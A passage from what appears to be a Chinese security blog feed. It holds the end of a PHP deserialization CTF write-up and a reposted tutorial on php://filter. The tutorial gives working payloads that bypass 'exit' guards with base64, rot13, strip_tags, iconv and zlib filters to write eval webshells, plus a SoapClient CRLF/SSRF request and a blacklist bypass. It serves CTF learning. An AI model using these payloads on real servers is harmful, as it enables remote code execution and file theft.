1pop=O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22C%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22phpinf%22%3Bs%3A1%3A%22c%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A11%3A%220e215962017%22%3Bs%3A1%3A%22b%22%3Br%3A2%3B%7D%7Ds%3A1%3A%22b%22%3BN%3Bs%3A1%3A%22k%22%3BN%3B</code></pre><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574489346-916347ef-296e-406f-9900-d79d5a42f78d.png" alt="img"></p><p>我们成功找到了根目录下flag文件的名称,接下来同理，构造原生类读取文件即可</p><p>1.session反序列化</p><pre><code class="php">POST /?d0g3=php_serialize&amp;baby=session.serialize_handler HTTP/1.1Host: 47.108.29.107:10354User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 493Origin: http://47.108.29.107:10354Connection: closeReferer: http://47.108.29.107:10354/Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hlUpgrade-Insecure-Requests: 1sess=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A63%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DSplFileObject%26b%3D%2Ff1111llllllaagg%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A157%3A%22wupco%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+6%0D%0A%0D%0AHY%3D666%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre><p>2.触发读flag文件(这里用的SplFileObject原生类)</p><p>这里的数据包和上面一样，不过这题反序列化的时候要等挺长时间的</p><p>3.访问主页面，记得不要再传参了，session会被覆盖</p><p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574785928-ec75acf4-bc07-40e5-b354-204c3470effd.png" alt="img"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/xiaoqiyue/p/10951836.html">https://www.cnblogs.com/xiaoqiyue/p/10951836.html</a></p><p><a href="https://blog.csdn.net/weixin_39616995/article/details/118546436">https://blog.csdn.net/weixin_39616995/article/details/118546436</a></p><p><a href="https://www.cnblogs.com/webu/archive/2013/01/28/2879383.html">https://www.cnblogs.com/webu/archive/2013/01/28/2879383.html</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a></p><p><a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解php://fliter</title>
      <link href="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/"/>
      <url>/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>(看到这么一篇文章，感觉作者已经把这个考点总结的非常到位了，我就直接搬运过来了)</p><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><pre><code>php:// — 访问各个输入/输出流（I/O streams）php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</code></pre><p><code>php://filter</code> 参数</p><p><code>php://filter</code>可以作为一个中间流来处理其他流。<br><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201164511180.png" alt="image-20221201164511180"></p><p>测试代码：</p><pre><code class="php">&lt;?php    highlight_file(__FILE__);    header(&quot;Content-Type: text/html; charset=utf-8&quot;);    $file1 = $_GET[&#39;file1&#39;];    $file2 = $_GET[&#39;file2&#39;];    $txt = $_GET[&#39;txt&#39;];    echo file_get_contents($file1);    file_put_contents($file2,$txt);?&gt;</code></pre><p>读取文件：</p><pre><code class="php"># 明文读取index.php?file1=php://filter/resource=flag.php</code></pre><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201165336313.png" alt="image-20221201165336313"></p><pre><code class="php"># 编码读取index.php?file1=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201165407569.png" alt="image-20221201165407569"></p><p>写入文件：</p><pre><code class="php"># 明文写入index.php?file2=php://filter/resource=test.txt&amp;txt=helloworld</code></pre><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201170013270.png" alt="image-20221201170013270"></p><pre><code class="php"># 编码写入index.php?file2=php://filter/write=convert.base64-encode/resource=test.txt&amp;txt=helloworld</code></pre><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201170104909.png" alt="image-20221201170104909"></p><h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><h2 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h2><p><strong>string.rot13</strong></p><pre><code class="php">string.rot13 （自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据。str_rot13—对字符串执行ROT13转换. ROT13编码简单地使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</code></pre><p><strong>string.toupper</strong></p><pre><code class="php">string.toupper  (自 PHP 5.0.0 起) 使用此过滤器等同于用 strtoupper()函数处理所有的流数据。strtoupper—将字符串转化为大写</code></pre><p><strong>string.tolower</strong></p><pre><code class="php">string.tolower （自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。strtolower—将字符串转化为小写</code></pre><h2 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h2><p>使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。 </p><p>strip_tags—从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串str去除空字符、HTML 和 PHP 标记后的结果。它使用与函数fgetss()一样的机制去除标记。</p><h2 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h2><p>如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。对于指定过滤器的更多信息，请参考该函数的手册页:<a href="https://www.php.net/manual/zh/filters.convert.php">https://www.php.net/manual/zh/filters.convert.php</a></p><p><strong>convert.base64</strong></p><pre><code class="php">convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用base64_encode()和base64_decode()函数处理所有的流数据。convert.base64-encode支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用line-length个字符为长度而截成块。如果给出了line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用base64_encode()再加上 chunk_split()相同。</code></pre><p><strong>convert.quoted</strong></p><pre><code class="php">convert.quoted-printable-encode和convert.quoted-printable-decode使用此过滤器的decode版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和convert.quoted-printable-encode相对应的函数。convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数binary和 force-encode-first。convert.base64-decode只支持line-break-chars参数作为从编码载荷中剥离的类型提示。</code></pre><p><strong>convert.iconv.</strong>*</p><p>这个过滤器需要<code>php</code>支持 <code>iconv</code> ，而<code>iconv</code>是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p><p><code>iconv</code> — 字符串按要求的字符编码来转换</p><p>convery.iconv.*的使用有两种方法:</p><pre><code class="php">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; or convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</code></pre><p>支持的字符编码有一下几种（详细参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a>）</p><pre><code class="php">UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*</code></pre><p><strong>压缩过滤器</strong></p><p>虽然 <a href="https://www.php.net/manual/zh/wrappers.compression.php">压缩封装协议</a> 提供了在本地文件系统中 创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。</p><pre><code class="php">Note: 压缩过滤器 不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 zlib.* 压缩过滤器自 PHP 版本 5.1.0起可用，在激活 zlib的前提下。也可以通过安装来自 » PECL的 » zlib_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中 不可用。</code></pre><pre><code class="php">?file=compress.zlib://flag.php</code></pre><p><strong>加密过滤器</strong></p><pre><code class="php">mcrypt.*和 mdecrypt.*使用libmcrypt提供了对称的加密和解密。这两组过滤器都支持mcrypt扩展库中相同的算法，格式为 mcrypt.ciphername，其中ciphername是密码的名字，将被传递给mcrypt_module_open()。有以下五个过滤器参数可用：</code></pre><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201171811276.png" alt="image-20221201171811276"></p><h1 id="绕过死亡exit-易"><a href="#绕过死亡exit-易" class="headerlink" title="绕过死亡exit(易)"></a>绕过死亡exit(易)</h1><p>源码:</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);$filename=$_GET[&#39;filename&#39;];$content=$_GET[&#39;content&#39;];file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</code></pre><p>$content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了。那么这种情况下，如何绕过这个“死亡exit”？</p><p>思路其实也很简单我们只要将content前面的那部分内容使用某种手段（编码等）进行处理，导致php不能识别该部分就可以了。</p><p>这里的$_POST[‘filename’]是可以控制协议的.</p><h2 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h2><p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</p><p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码</p><p>当$content被加上了<?php exit; ?>以后，我们可以使用php://filter/write=convert.base64-decode来首先对其解码。在解码的过程中，字符&lt; ? ; &gt;空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有”phpexit”和我们传入的其他字符。</p><p>由于，”phpexit”一共7个字符，但是base64算法解码时是4个byte一组，所以我们可以随便再给他添加一个字符。这样前边的phpexit加上另一个字符就会被base64解码，然后后边的我们精心构造的base64字符串也会被成功解码为php代码。</p><p>payload:</p><pre><code class="php">?filename=php://filter/convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==# PD9waHAgZXZhbCgkX1BPU1RbYV0pOw== --&gt;   &lt;?php eval($_POST[a]);</code></pre><p>成功写入</p><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201173344222.png" alt="image-20221201173344222"></p><p>尝试连接:</p><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201173446876.png" alt="image-20221201173446876"></p><h2 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a>rot13绕过</h2><p>str_rot13—对字符串执行ROT13转换. ROT13编码简单地使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p><p>利用php://filter中string.rot13过滤器去除”exit”。string.rot13的特性是编码和解码都是自身完成，利用这一特性可以去除exit。 <?php exit;?> 在经过rot13编码后会变成 <?cuc rkvg();?> ，不过这种利用手法的前提是PHP不开启short_open_tag</p><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201173642560.png" alt="image-20221201173642560"></p><p>虽然官方说的默认开启，但是在<code>php.ini</code>中默认是注释掉的，也就是说它还是默认关闭。</p><p>payload:</p><pre><code class="php">?filename=php://filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG[n]);</code></pre><p>成功写入:</p><pre><code class="php">root@nxacloud-hycomegg:/var/www/html# cat 2.php&lt;?cuc rkvg();&lt;?php eval($_POST[a]);</code></pre><h2 id="string-strip-tags-1"><a href="#string-strip-tags-1" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h2><p><code>strip_tags</code>— 从字符串中去除 HTML 和 PHP 标记。该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数<code>fgetss()</code>一样的机制去除标记。</p><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201174051617.png" alt="image-20221201174051617"></p><p>但是我们的目的是写入<code>webshell</code>，如果那样的话，我们的<code>webshell</code>岂不是同样起不了作用，不过我们可以使用多个过滤器进行绕过这个限制（<code>php://filter</code>允许通过使用多个过滤器）。</p><pre><code class="php">1、webshell用base64编码   //为了避免strip_tags的影响2、调用string.strip_tags //这一步将去除&lt;?php exit; ?&gt;3、调用convert.base64-decode //这一步将还原base64编码的webshell</code></pre><p>payload:</p><pre><code class="php">?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></pre><p>成功写入:</p><pre><code class="php">root@nxacloud-hycomegg:/var/www/html# cat 3.php &lt;?php eval($_POST[a]);</code></pre><h2 id="htaccess的预包含处理"><a href="#htaccess的预包含处理" class="headerlink" title=".htaccess的预包含处理"></a>.htaccess的预包含处理</h2><p>PHP中<code>auto_prepend_file</code>与<code>auto_append_file</code>用法实例分析：</p><p><code>php.ini</code>中有两项：</p><pre><code class="php">auto_prepend_file 在页面顶部加载文件auto_append_file 在页面底部加载文件</code></pre><p>使用这种方法可以不需要改动任何页面，当需要修改顶部或底部<code>require</code>文件时，只需要修改<code>auto_prepend_file</code>与<code>auto_append_file</code>的值即可。</p><p>例如：修改<code>php.ini</code>，修改<code>auto_prepend_file</code>与<code>auto_append_file</code>的值。</p><pre><code class="php">auto_prepend_file = &quot;/home/fdipzone/header.php&quot;auto_append_file = &quot;/home/fdipzone/footer.php&quot;</code></pre><p>修改后重启服务器，这样所有页面的顶部与底部都会require /home/fdipzone/header.php与 /home/fdipzone/footer.php</p><p>如果不需要所有页面都在顶部或底部require文件，可以指定某一个文件夹内的页面文件才调用auto_prepend_file与auto_append_file<br>在需要顶部或底部加载文件的文件夹中加入.htaccess文件，内容如下：</p><pre><code class="php">php_value auto_prepend_file &quot;/home/fdipzone/header.php&quot;php_value auto_append_file &quot;/home/fdipzone/footer.php&quot;</code></pre><p>这样在指定<code>.htaccess</code>的文件夹内的页面文件才会加载<code>/home/fdipzone/header.php</code>与<code>/home/fdipzone/footer.php</code>，其他页面文件不受影响。</p><p>自定义包含我们的flag文件。</p><p>payload：</p><pre><code class="php">?filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=?&gt;php_value auto_prepend_file &quot;/flag&quot;</code></pre><p>首先来解释<code>$filename</code>的代码，这里引用了<code>string.strip_tags</code>过滤器，可以过滤<code>.htaccess</code>内容的<code>html</code>标签，自然也就消除了死亡代码；<code>$content</code>即闭合死亡代码使其完全消除，并且写入自定义包含文件；</p><p>这里我没有复现成功,原因是文件没有成功写入,先放下</p><h1 id="绕过死亡exit-难"><a href="#绕过死亡exit-难" class="headerlink" title="绕过死亡exit(难)"></a>绕过死亡exit(难)</h1><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);$content = $_GET[content];file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);</code></pre><p>这种情况下写入的文件，其文件名和文件部分内容一致，这就导致利用的难度大大增加了，不过最终目的还是相同的：都是为了去除文件头部内容<code>exit</code>这个关键代码写入<code>shell</code>后门。</p><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>构造：</p><pre><code class="php">content=php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php或content=php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></pre><p>进行拼接之后就是 <code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code> 然后会对其进行一次整体的 base64-decode 。从而分解掉死亡代码，</p><p>但是无法生成content；虽然文件创建成功，但是就是无法生成content。问题在于resource后边的 =；</p><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207220126186.png" alt="image-20221207220126186"></p><p><code>=</code>在<code>base64</code>中的作用是填充，也就是以为着结束；在<code>=</code>的后面是不允许有任何其他字符的否则会报错，</p><p>这里因为是由于<code>‘=’</code>从而使得我们写入<code>content</code>不成功，那么我们可以想个方法去掉等号即可</p><p>payload：</p><pre><code class="php">content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php</code></pre><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207220546144.png" alt="image-20221207220546144"></p><p>为什么这么写就能够成功写入呢?</p><p>首先传入content内容后,写入文件的内容变为:</p><pre><code class="php">&lt;?php exit();php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php</code></pre><p>我们发现什么?</p><p>php被闭合了,但是我们写入的base64在闭合标签外</p><p>首先调用<code>string.strip_tags</code> 去除掉php标签,结果</p><pre><code class="php">PD9waHAgcGhwaW5mbygpOz8+.php</code></pre><p>然后base64解密，文件的内容变为:</p><pre><code class="php">&lt;?php phpinfo();?&gt;乱码</code></pre><p>可以生成文件，并且可以看到我们已经成功写入了<code>shell</code>；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去；</p><p><strong>最终payload1:</strong></p><pre><code class="php">content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2b/../shell.php</code></pre><p>注意：这里<code>%2b</code>是<code>+</code>号的url编码，不进行编码会被当成空格处理</p><p>我们将前面的一串<code>base64</code>字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成<code>shell.php</code>文件；从而就可以生成正常的文件名.</p><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207221020006.png" alt="image-20221207221020006"></p><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207221044695.png" alt="image-20221207221044695"></p><p><strong>最终payload2:</strong></p><p>或者去掉等号之直接对内容进行变性另类<code>base64</code></p><p>其实这种也是借助于过滤器，但是原理并不是和之前的原理一样，之前的原理即是：闭合原本的死亡代码，然后在进行过滤器过滤掉内容中的<code>html</code>标签，从而对剩下的内容进行<code>base64</code>解码。但是这种方法却不是如此，payload如下：</p><pre><code class="php">php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2b/../shell.php</code></pre><p>这种<code>payload</code>的攻击原理即是首先直接在内容时，就将我们<code>base64</code>遇到的<code>=</code>这个问题直接写在<code>&lt;? ?&gt;</code>中进行过滤掉，然后<code>base64-decode</code>再对原本内容的<code>&lt;?php exit();</code>进行转码，从而达到分解死亡代码的效果</p><h2 id="rot13绕过-1"><a href="#rot13绕过-1" class="headerlink" title="rot13绕过"></a>rot13绕过</h2><p>尽管<code>base64</code>比较特别，但是并不是所有的编码都受限于‘=’，这里可以采用rot13编码即可；</p><p>payload：</p><pre><code class="php">content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.phpcontent=php://filter/write=string.rot13/resource=&lt;?cuc cucvasb();?&gt;/../shell.php</code></pre><p>生成文件内容：</p><pre><code class="php">&lt;?cuc rkvg();cuc://svygre/jevgr=fgevat.ebg13|&lt;?php phpinfo();?&gt;|/erfbhepr=f1zcyr.cuc</code></pre><p>其原理就是利用转码从而将原本的死亡代码进行转码从而使引擎无法识别从而避免死亡代码；</p><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207231257441.png" alt="image-20221207231257441"></p><h2 id="convert-iconv-绕过"><a href="#convert-iconv-绕过" class="headerlink" title="convert.iconv.*绕过"></a>convert.iconv.*绕过</h2><p>对于<code>iconv</code>字符编码转换进行绕过的手法，其实类似于上面所述的<code>base64</code>编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制<code>exit;</code>去除，而我们的恶意代码正常解码存储。</p><ul><li><strong>usc-2</strong></li></ul><p>通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-2中2的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了</p><pre><code class="php">echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#39;&lt;?php @eval($_POST[ab]);?&gt;&#39;);</code></pre><p>payload:</p><pre><code class="php">php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?/resource=shell.php</code></pre><p>成功向 <code>shell.php</code> 写入</p><pre><code class="php">?&lt;hp pxeti)(p;ph/:f/liet/rocvnre.tcino.vCU-SL2.ECU-SB2|E&lt;?php @eval($_POST[ab]);?&gt;r/seuocr=ehsle.l</code></pre><ul><li><strong>usc-4</strong></li></ul><p>通过UCS-4方式，对目标字符串进行4位一反转（这里的4LE和4BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-4中4的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了</p><pre><code class="php">&lt;?phpecho iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,&#39;&lt;?php @eval($_POST[abcd]);?&gt;&#39;);</code></pre><p>28字符 <code>&lt;?php @eval($_POST[abcd]);?&gt;</code> 转为 <code>hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;)</code></p><p>payload:</p><pre><code class="php">content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;)/resource=shell.php</code></pre><p>成功写入：</p><pre><code class="php">hp?&lt;xe p)(tiphp;f//:etlioc/rrevnci.t.vno-SCU.EL4-SCU|EB4&lt;?php @eval($_POST[abcd]);?&gt;ser/cruohs=e.lle</code></pre><ul><li><strong>utf8-utf7</strong></li></ul><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/20210525230208293.png" alt="在这里插入图片描述"></p><p>这里发现生成的是+AD0-,然而经过检测，此字符串可以被base64进行解码；那也就意味着我们可以使用这种方法避免等号对我们base64解码的影响；我们可以直接写入base64加密后的payload，然后将其进行utf之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的base64-encode之后的编码依然是存在的，然后进行base64-decode一下，写入shell.</p><p>payload:</p><pre><code class="php">content=php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</code></pre><p>ps：</p><pre><code class="php">// 这里要符合base64 解码按4 字节进行utf8 -&gt; utf-7&lt;?php exit();php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php变为：+ADw?php exit()+ADs-php://filter/write+AD0-aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+-+AHw-convert.iconv.utf-8.utf-7+AHw-convert.base64-decode/resource+AD0-shell.phpbase64恶意payload的之前正好36个字节，所以写入了shell</code></pre><p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207232652549.png" alt="image-20221207232652549"></p><h1 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h1><h2 id="VMCTF-Checkin"><a href="#VMCTF-Checkin" class="headerlink" title="VMCTF Checkin"></a>VMCTF Checkin</h2><pre><code class="php">&lt;?php//PHP 7.0.33 Apache/2.4.25error_reporting(0);$sandbox = &#39;/var/www/html/&#39; . md5($_SERVER[&#39;HTTP_X_REAL_IP&#39;]);@mkdir($sandbox);@chdir($sandbox);highlight_file(__FILE__);if(isset($_GET[&#39;content&#39;])) &#123;    $content = $_GET[&#39;content&#39;];    if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))         die(&#39;hacker&#39;);    if(file_exists($content))        require_once($content);    echo $content;    file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);&#125;</code></pre><p>这里主要就是考察过滤器构造绕过</p><p>题目中过滤的过滤器有</p><pre><code class="php">/iconv|UCS|UTF|rot|quoted|base64/</code></pre><p>但是需要注意<code>file_put_contents</code>要调用伪协议，</p><pre><code class="php">static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) &#123;    char *p, *token = NULL;    php_stream_filter *temp_filter;    p = php_strtok_r(filterlist, &quot;|&quot;, &amp;token);    while (p) &#123;        php_url_decode(p, strlen(p));#对过滤器进行了一次urldecode        if (read_chain) &#123;            if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123;                php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter);            &#125; else &#123;                php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p);            &#125;        &#125;        if (write_chain) &#123;            if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123;                php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter);            &#125; else &#123;                php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p);            &#125;        &#125;        p = php_strtok_r(NULL, &quot;|&quot;, &amp;token);    &#125;&#125;</code></pre><p>而伪协议处理时会对过滤器 <code>urldecode</code> 一次，所以是可以利用二次编码绕过的，</p><p>payload:</p><pre><code class="php">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=w0s1np.php</code></pre><p>注：payload放过滤器的位置或者放文件名位置都可（因为有些编码有时候会有空格什么的乱码，文件名不一定好用），php://filter面对不可用的规则是报个Warning，然后跳过继续执行的）。</p><p>还可以利用压缩过滤器以及加密过滤器：</p><p>zlib 的 zlib.deflate 和 zlib.inflate ，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续 inflate 的内容，简单遍历一下可以发现中间插入 string.tolower 转后会把空格和 exit 处理了就可以绕过exit</p><pre><code class="php">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php</code></pre><h1 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a>原文链接</h1><p><a href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php文件包含总结</title>
      <link href="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/"/>
      <url>/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/</url>
      
